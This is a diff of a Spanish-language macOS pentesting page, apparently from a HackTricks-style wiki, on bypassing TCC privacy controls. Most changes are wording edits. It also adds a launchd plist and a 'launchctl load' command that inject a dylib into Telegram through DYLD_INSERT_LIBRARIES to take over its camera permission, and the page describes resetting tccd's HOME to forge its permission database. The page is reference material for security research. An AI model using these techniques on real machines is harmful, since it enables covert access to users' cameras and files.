@@ -44,7 +44,7 @@ Ten en cuenta que ahora, para poder habilitar SSH, necesitas "Acceso completo al
 
 ### Manejar extensiones - CVE-2022-26767
 
-El atributo `com.apple.macl` se otorga a los archivos para darle a una determinada aplicación permisos para leerlo. Este atributo se establece cuando se arrastra y se suelta un archivo sobre una aplicación, o cuando un usuario hace doble clic en un archivo para abrirlo con la aplicación predeterminada.
+El atributo `com.apple.macl` se otorga a los archivos para darle a una aplicación específica permisos para leerlo. Este atributo se establece cuando se arrastra y se suelta un archivo sobre una aplicación, o cuando un usuario hace doble clic en un archivo para abrirlo con la aplicación predeterminada.
 
 Por lo tanto, un usuario podría registrar una aplicación maliciosa para manejar todas las extensiones y llamar a Launch Services para abrir cualquier archivo (de modo que el archivo malicioso obtendrá acceso para leerlo).
 
@@ -66,7 +66,7 @@ Para obtener más información sobre los Apple Scripts, consulta:
 [macos-apple-scripts.md](macos-apple-scripts.md)
 {% endcontent-ref %}
 
-Por ejemplo, si una aplicación tiene permiso de Automatización sobre `iTerm`, por ejemplo en este ejemplo **`Terminal`** tiene acceso sobre iTerm:
+Por ejemplo, si una aplicación tiene permiso de Automatización sobre `iTerm`, por ejemplo en este caso **`Terminal`** tiene acceso a iTerm:
 
 <figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -109,7 +109,7 @@ do shell script "rm " & POSIX path of (copyFile as alias)
 El demonio **tccd** en el espacio de usuario utiliza la variable de entorno **`HOME`** para acceder a la base de datos de usuarios de TCC desde: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
 
 Según [esta publicación de Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) y debido a que el demonio TCC se ejecuta a través de `launchd` dentro del dominio del usuario actual, es posible **controlar todas las variables de entorno** que se le pasan.\
-Por lo tanto, un **atacante podría establecer la variable de entorno `$HOME`** en **`launchctl`** para que apunte a un **directorio controlado**, **reiniciar** el demonio **TCC** y luego **modificar directamente la base de datos de TCC** para otorgarse a sí mismo **todos los privilegios de TCC disponibles** sin solicitar la aprobación del usuario final.\
+Por lo tanto, un **atacante podría establecer la variable de entorno `$HOME`** en **`launchctl`** para que apunte a un **directorio controlado**, **reiniciar** el demonio **TCC** y luego **modificar directamente la base de datos de TCC** para otorgarse a sí mismo **todos los permisos de TCC disponibles** sin solicitar la aprobación del usuario final.\
 PoC:
 ```bash
 # reset database just in case (no cheating!)
@@ -174,7 +174,7 @@ launchctl setenv SQLITE_AUTO_TRACE 1
 ```
 ### Apple Remote Desktop
 
-Como root, podrías habilitar este servicio y el agente **ARD tendrá acceso completo al disco**, lo cual podría ser abusado por un usuario para hacer que copie una nueva base de datos de usuario de TCC.
+Como root, puedes habilitar este servicio y el agente **ARD tendrá acceso completo al disco**, lo cual podría ser abusado por un usuario para hacer que copie una nueva base de datos de usuario de TCC.
 
 ## Mediante **NFSHomeDirectory**
 
@@ -182,7 +182,7 @@ TCC utiliza una base de datos en la carpeta HOME del usuario para controlar el a
 Por lo tanto, si el usuario logra reiniciar TCC con una variable de entorno $HOME que apunte a una **carpeta diferente**, el usuario podría crear una nueva base de datos de TCC en **/Library/Application Support/com.apple.TCC/TCC.db** y engañar a TCC para que otorgue cualquier permiso de TCC a cualquier aplicación.
 
 {% hint style="success" %}
-Ten en cuenta que Apple utiliza la configuración almacenada dentro del perfil del usuario en el atributo **`NFSHomeDirectory`** como valor de `$HOME`, por lo que si comprometes una aplicación con permisos para modificar este valor (`kTCCServiceSystemPolicySysAdminFiles`), puedes **armar** esta opción con un bypass de TCC.
+Ten en cuenta que Apple utiliza la configuración almacenada dentro del perfil del usuario en el atributo **`NFSHomeDirectory`** como valor de `$HOME`, por lo que si comprometes una aplicación con permisos para modificar este valor (**`kTCCServiceSystemPolicySysAdminFiles`**), puedes **armar** esta opción con un bypass de TCC.
 {% endhint %}
 
 ### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>
@@ -200,8 +200,8 @@ El **primer POC** utiliza [**dsexport**](https://www.unix.com/man-page/osx/1/dse
 5. Importa la entrada de Servicios de Directorio modificada con [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
 6. Detén el proceso _tccd_ del usuario y reinicia el proceso.
 
-El segundo POC utilizó **`/usr/libexec/configd`** que tenía `com.apple.private.tcc.allow` con el valor **`kTCCServiceSystemPolicySysAdminFiles`**.\
-Era posible ejecutar **`configd`** con la opción **`-t`**, por lo que un atacante podría especificar una **Carga personalizada de paquete**. Por lo tanto, el exploit **reemplaza** el método de cambio del directorio de inicio del usuario mediante **inyección de código en `configd`**.
+El segundo POC utilizó **`/usr/libexec/configd`** que tenía `com.apple.private.tcc.allow` con el valor `kTCCServiceSystemPolicySysAdminFiles`.\
+Era posible ejecutar **`configd`** con la opción **`-t`**, por lo que un atacante podría especificar una **Carga de paquete personalizada**. Por lo tanto, el exploit **reemplaza** el método **`dsexport`** y **`dsimport`** para cambiar el directorio de inicio del usuario con una **inyección de código en `configd`**.
 
 Para obtener más información, consulta el [**informe original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).
 
@@ -220,7 +220,7 @@ Los plugins son código adicional generalmente en forma de bibliotecas o plist, 
 
 La aplicación `/System/Library/CoreServices/Applications/Directory Utility.app` tenía el entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, cargaba plugins con extensión **`.daplug`** y **no tenía el runtime endurecido**.
 
-Para aprovechar esta CVE, se **cambia** el **`NFSHomeDirectory`** (abusando del entitlement anterior) para poder **tomar el control de la base de datos de TCC** de los usuarios y eludir TCC.
+Para aprovechar esta CVE, se **cambia** el **`NFSHomeDirectory`** (abusando del entitlement anterior) para poder **tomar el control de la base de datos de TCC de los usuarios** y eludir TCC.
 
 Para obtener más información, consulta el [**informe original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
 
@@ -259,7 +259,7 @@ Para obtener más información, consulta el [**informe original**](https://wojci
 
 ### Plug-Ins de la Capa de Abstracción de Dispositivos (DAL)
 
-Las aplicaciones del sistema que abren la transmisión de la cámara a través de Core Media I/O (aplicaciones con **`kTCCServiceCamera`**) cargan **en el proceso estos complementos** ubicados en `/Library/CoreMediaIO/Plug-Ins/DAL` (no restringidos por SIP).
+Las aplicaciones del sistema que abren el flujo de la cámara a través de Core Media I/O (aplicaciones con **`kTCCServiceCamera`**) cargan **en el proceso estos complementos** ubicados en `/Library/CoreMediaIO/Plug-Ins/DAL` (no restringidos por SIP).
 
 Simplemente almacenar allí una biblioteca con el **constructor** común funcionará para **inyectar código**.
 
@@ -267,7 +267,7 @@ Varias aplicaciones de Apple eran vulnerables a esto.
 
 ### Firefox
 
-La aplicación de Firefox sigue siendo vulnerable si tiene el permiso `com.apple.security.cs.disable-library-validation`:
+La aplicación de Firefox tenía los permisos `com.apple.security.cs.disable-library-validation` y `com.apple.security.cs.allow-dyld-environment-variables`:
 ```xml
 codesign -d --entitlements :- /Applications/Firefox.app
 Executable=/Applications/Firefox.app/Contents/MacOS/firefox
@@ -279,6 +279,8 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
 <true/>
 <key>com.apple.security.cs.disable-library-validation</key>
+<true/>
+<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
 <true/>
 <key>com.apple.security.device.audio-input</key>
 <true/>
@@ -299,15 +301,45 @@ El binario `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tenía los
 
 ### CVE-2023-26818 - Telegram
 
-Telegram tenía los permisos `com.apple.security.cs.allow-dyld-environment-variables` y `com.apple.security.cs.disable-library-validation`, por lo que era posible abusar de ellos para **obtener acceso a sus permisos**, como grabar con la cámara. Puedes encontrar el **código malicioso en el informe**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
+Telegram tenía los permisos **`com.apple.security.cs.allow-dyld-environment-variables`** y **`com.apple.security.cs.disable-library-validation`**, por lo que era posible abusar de ellos para **obtener acceso a sus permisos**, como grabar con la cámara. Puedes encontrar el **código malicioso en el informe**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
 
-## Mediante invocaciones abiertas
+Observa cómo se utiliza la variable de entorno para cargar una biblioteca, se creó un **plist personalizado** para inyectar esta biblioteca y se utilizó **`launchctl`** para ejecutarlo:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>Label</key>
+<string>com.telegram.launcher</string>
+<key>RunAtLoad</key>
+<true/>
+<key>EnvironmentVariables</key>
+<dict>
+<key>DYLD_INSERT_LIBRARIES</key>
+<string>/tmp/telegram.dylib</string>
+</dict>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
+</array>
+<key>StandardOutPath</key>
+<string>/tmp/telegram.log</string>
+<key>StandardErrorPath</key>
+<string>/tmp/telegram.log</string>
+</dict>
+</plist>
+```
 
-Es posible invocar **`open`** incluso cuando se está en un entorno sandbox.
+```bash
+launchctl load com.telegram.launcher.plist
+```
+## Por medio de invocaciones abiertas
+
+Es posible invocar **`open`** incluso estando en un entorno sandbox&#x20;
 
 ### Scripts de Terminal
 
-Es bastante común darle al terminal **Acceso completo al disco (FDA)**, al menos en computadoras utilizadas por personas técnicas. Y es posible invocar scripts **`.terminal`** utilizando esto.
+Es bastante común darle a la terminal **Acceso completo al disco (FDA)**, al menos en computadoras utilizadas por personas técnicas. Y es posible invocar scripts **`.terminal`** utilizando esto.
 
 Los scripts **`.terminal`** son archivos plist como este, con el comando a ejecutar en la clave **`CommandString`**:
 ```xml
